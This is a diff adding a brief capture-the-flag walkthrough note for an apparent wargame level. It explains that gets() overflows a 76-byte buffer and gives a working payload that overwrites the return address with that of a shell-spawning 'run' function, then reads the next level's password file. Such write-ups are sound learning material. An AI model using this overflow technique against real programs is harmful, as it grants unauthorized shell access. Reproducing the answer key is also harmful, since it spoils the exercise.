@@ -1,0 +1,11 @@
+Under hopper or ghidra disassembler we see a "run" function
+0x08048444 address of the run function running a shell  built-in
+Function gets is vulnerable (man gets)
+We see a variable with 76 char used by gets
+So using a 76char string + "address of run" code will execute run function
+Use the following payload:
+
+(python -c 'print "A"*76 + "\x08\x04\x84\x44"[::-1]'; cat -) | ./level1
+
+cd ../level2
+cat .pass
